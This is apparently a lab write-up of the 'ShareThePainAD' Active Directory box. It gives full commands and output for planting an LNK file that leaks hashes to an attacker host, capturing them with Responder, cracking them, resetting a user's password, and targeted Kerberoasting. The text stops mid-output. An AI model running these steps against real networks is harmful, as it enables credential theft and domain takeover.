[{"title":"ShareThePainAD","url":"/2025/11/23/ShareThePainAD/","content":"![](/img/Share.png)\n\nThis Active Directory machine starts off with ZERO CREDENTIALS. So our initial scan shows us normal ports open for a server. We first check SMB to find we have guest auth to a 'Share' directory. We have READ,WRITE to the directory. So after uploading a lnk file we capture the hash for bob.ross. Once a bloodhound dump is obtained, we find we have GenericAll to user alice.wonderland. We can do this a couple ways with entail setting a SPN and TargetedKerberoasting or change her password. This user alice.wonderland has access to the box being in Remote Management Users. After poking around some we find a SQL directory at C:\\ but no access. Nevertheless, this is a older Windows Machine (Server 2022). Using CVE-2024-35250 to exploit at the kernel level we are able to obtain SYSTEM using msfconsole. \n\n\n# Initial Scan\n```\nPORT     STATE SERVICE       REASON          VERSION\n53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus\n88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-23 21:01:32Z)\n135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 126\n464/tcp  open  kpasswd5?     syn-ack ttl 126\n593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack ttl 126\n3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 126\n3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services\n| ssl-cert: Subject: commonName=DC01.hack.smarter\n| Issuer: commonName=DC01.hack.smarter\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-09-05T03:46:00\n| Not valid after:  2026-03-07T03:46:00\n| MD5:   4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc\n| SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692\n| -----BEGIN CERTIFICATE-----\n| MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc\n| MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y\n| NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN\n| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+\n| MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI\n| GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap\n| DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL\n| JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2\n| UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB\n| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN\n| AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW\n| ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT\n| ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg\n| MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/\n| q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl\n| UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y=\n|_-----END CERTIFICATE-----\n|_ssl-date: 2025-11-23T21:01:42+00:00; 0s from scanner time.\n| rdp-ntlm-info:\n|   Target_Name: HACK\n|   NetBIOS_Domain_Name: HACK\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hack.smarter\n|   DNS_Computer_Name: DC01.hack.smarter\n|   DNS_Tree_Name: hack.smarter\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-11-23T21:01:34+00:00\n5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: mean: 0s, deviation: 0s, median: 0s\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 20320/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 13605/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 7253/udp): CLEAN (Timeout)\n|   Check 4 (port 64780/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time:\n|   date: 2025-11-23T21:01:39\n|_  start_date: N/A\n```\nAdding the hostnames to our *hosts* file.\n\n# SMB\n\nWe can check the usual null auth and Guest logins to see if we have access.\n\n```\nkonoha# nxc smb hack.smarter -u Guest -p '' --shares\nSMB         10.0.21.159     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)\nSMB         10.0.21.159     445    DC01             [+] hack.smarter\\Guest:\nSMB         10.0.21.159     445    DC01             [*] Enumerated shares\nSMB         10.0.21.159     445    DC01             Share           Permissions     Remark\nSMB         10.0.21.159     445    DC01             -----           -----------     ------\nSMB         10.0.21.159     445    DC01             ADMIN$                          Remote Admin\nSMB         10.0.21.159     445    DC01             C$                              Default share\nSMB         10.0.21.159     445    DC01             IPC$            READ            Remote IPC\nSMB         10.0.21.159     445    DC01             NETLOGON                        Logon server share\nSMB         10.0.21.159     445    DC01             Share           READ,WRITE\nSMB         10.0.21.159     445    DC01             SYSVOL                          Logon server share\n```\nWhich in this case we do, and we have READ,WRITE. SO we can just upload a little lnk file using a module from NetExec. \n```\nkonoha# nxc smb hack.smarter -u Guest -p '' -M slinky -o SERVER=10.200.21.53 NAME=EVILMElol\n[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded\nSMB         10.0.21.159     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)\nSMB         10.0.21.159     445    DC01             [+] hack.smarter\\Guest:\nSMB         10.0.21.159     445    DC01             [*] Enumerated shares\nSMB         10.0.21.159     445    DC01             Share           Permissions     Remark\nSMB         10.0.21.159     445    DC01             -----           -----------     ------\nSMB         10.0.21.159     445    DC01             ADMIN$                          Remote Admin\nSMB         10.0.21.159     445    DC01             C$                              Default share\nSMB         10.0.21.159     445    DC01             IPC$            READ            Remote IPC\nSMB         10.0.21.159     445    DC01             NETLOGON                        Logon server share\nSMB         10.0.21.159     445    DC01             Share           READ,WRITE\nSMB         10.0.21.159     445    DC01             SYSVOL                          Logon server share\nSLINKY      10.0.21.159     445    DC01             [+] Found writable share: Share\nSLINKY      10.0.21.159     445    DC01             [+] Created LNK file on the Share share\n```\n\nSetting up responder, we are able to capture a hash for *bob.ross*.\n```\nkonoha# responder -I tun0 -w\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    MDNS                       [ON]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [ON]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n<SNIP>\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.0.21.159\n[SMB] NTLMv2-SSP Username : HACK\\bob.ross\n[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:de13d20268eb75c7:<SNIP>:<SNIP>\n```\n![](/img/bingo.gif)\n## Sidequest to crack the code\n\nI've been using john alot lately, I know hashcat is far more superior, but it works better on a VM then hashcat does. \n```\nkonoha# john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt bob.ross.hash\nbob.ross:<SNIP>:HACK:<SNIP>:<SNIP>:01010000000000000068DBCE8A5CDC01EA1F015C7365CD7E00000000020008004200560053004F0001001E00570049004E002D00310047004D005600530033004B004300390058005A0004003400570049004E002D00310047004D005600530033004B004300390058005A002E004200560053004F002E004C004F00430041004C00030014004200560053004F002E004C004F00430041004C00050014004200560053004F002E004C004F00430041004C00070008000068DBCE8A5CDC0106000400020000000800300030000000000000000100000000200000DCBC15A58118355D3E1B347123254BC6DB985C847FADA324A020982E5BF737430A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300030002E00320031002E00350033000000000000000000\n```\n\n# New Found LAND!!!\n\nWith our newly aquired credentials, we can get a bloodhound dump and look at what we have. I'm using bloodyAD to get my dump.\n\n```\nkonoha# bloodyAD -v DEBUG -d hack.smarther -u bob.ross -p '<SNIP>' -H dc01.hack.smarter get bloodhound\n[*] Connection URL: ldap+ntlm-pw://hack.smarther\\bob.ross:<SNIP>@dc01.hack.smarter/?serverip=10.0.21.159\n[*] Trying to connect to dc01.hack.smarter...\n[*] Connection successful\n[+] Connecting to LDAP server\n[+] Connected to LDAP serrver\nDumping schema: 2it [00:00, 17.50it/s]\nGenerating lookuptable: 79it [00:00, 250.85it/s]\nDumping SDs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 83/83 [00:02<00:00, 32.79it/s]\nDumping domains: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00<00:00, 10.87it/s]\nDumping users: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 6/6 [00:00<00:00, 173.06it/s]\nDumping computers: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00<00:00, 32.17it/s]\nDumping groups: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 49/49 [00:00<00:00, 995.52it/s]\nDumping GPOs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 2/2 [00:00<00:00, 68.76it/s]\nDumping OUs: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1/1 [00:00<00:00, 33.37it/s]\nDumping Containers: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 19/19 [00:00<00:00, 363.72it/s]\n[+] Bloodhound data saved to 20251123T234611_Bloodhound.zip\n[+] Found 0 trust\n```\n\nOnce uploaded to bloodhound we can check pathes. This shows us we have *GenericAll* over *alice.wonderland*.\n\n![](/img/HSSHARE.png)\n\nWe can do many things here, but I simply just changed her password. I don't genuinely like to start off by changing the password, especially on a red-team engagement.  (I'll show targetedKerberoasting as well.)\n\n```\nbloodyAD -v DEBUG -d hack.smarther -u bob.ross -p '<SNIP>' -H dc01.hack.smarter set password alice.wonderland P@ssw0rd\n[*] Connection URL: ldap+ntlm-pw://hack.smarther\\bob.ross:<SNIP>@dc01.hack.smarter/?serverip=10.0.21.159\n[*] Trying to connect to dc01.hack.smarter...\n[*] Connection successful\n[+] Password changed successfully!\n```\n## TargetedKerberoasting\n\nFirst we set a SPN for the user.\n\n```\nkonoha# bloodyAD -v DEBUG -d hack.smarther -u bob.ross -p '137Password123!@#' -H dc01.hack.smarter msldap addspn 'CN=alice.wonderland,CN=Users,DC=hack,DC=smarter' cifs/bic\n[*] Connection URL: ldap+ntlm-pw://hack.smarther\\bob.ross:137Password123%21%40%23@dc01.hack.smarter/?serverip=10.0.21.159\n[*] Trying to connect to dc01.hack.smarter...\n[*] Connection successful\nSPN added!\n```\n\nThen we can just simply targetedkerberoast this user.\n```\nkonoha# python3 /opt/tools/targetedKerberoast/targetedKerberoast.py -u bob.ross -p '<SNIP>' --dc-ip 10.0.21.159 -d hack.smarter --request-user alice.wonderland\n[*] Starting kerberoast attacks\n[*] Attacking user (alice.wonderland)\n[+] Printing hash for 